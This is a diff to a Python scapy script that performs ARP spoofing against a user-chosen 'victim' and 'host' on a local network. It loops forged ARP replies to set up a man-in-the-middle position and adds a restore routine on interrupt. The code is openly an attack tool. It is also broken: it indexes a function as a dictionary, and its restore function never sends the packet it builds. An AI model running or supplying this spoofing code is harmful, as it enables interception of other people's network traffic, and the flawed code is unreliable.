@@ -2,6 +2,7 @@ import scapy.all as scapy
 import subprocess
 import re
 import time
+import threading
 
 
 def choose_iface_ip():
@@ -27,10 +28,13 @@ def scan(ip):
     return clients
 
 def spoof(victim_ip,host_ip):
-    while(True):
-        scapy.send(scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip))
-        scapy.send(scapy.ARP(op=2,pdst=host_ip, hwdst=scan[host_ip], psrc=victim_ip))
-        time.sleep(2)
+        packet = scapy.ARP(op=2,pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip)
+        scapy.send(packet, verbose=False)
+
+
+def restore(victim_ip, host_ip):
+    packet = scapy.ARP(op=2, pdst=victim_ip, hwdst=scan[victim_ip], psrc=host_ip, hwsrc=scan[host_ip])
+
 
 print('Choose one:',*choose_iface_ip(), sep='\n')
 ip1 = str(input())
@@ -44,4 +48,12 @@ print('Choose victim ip:')
 victim_ip = str(input())
 print('Choose host ip:')
 host_ip = str(input())
-spoof(victim_ip,host_ip)
+try:
+    while True:
+        spoof(victim_ip,host_ip)
+        spoof(host_ip, victim_ip)
+        time.sleep(2)
+except KeyboardInterrupt:
+    print('Restoring')
+    restore(victim_ip, host_ip)
+    restore(host_ip, victim_ip)
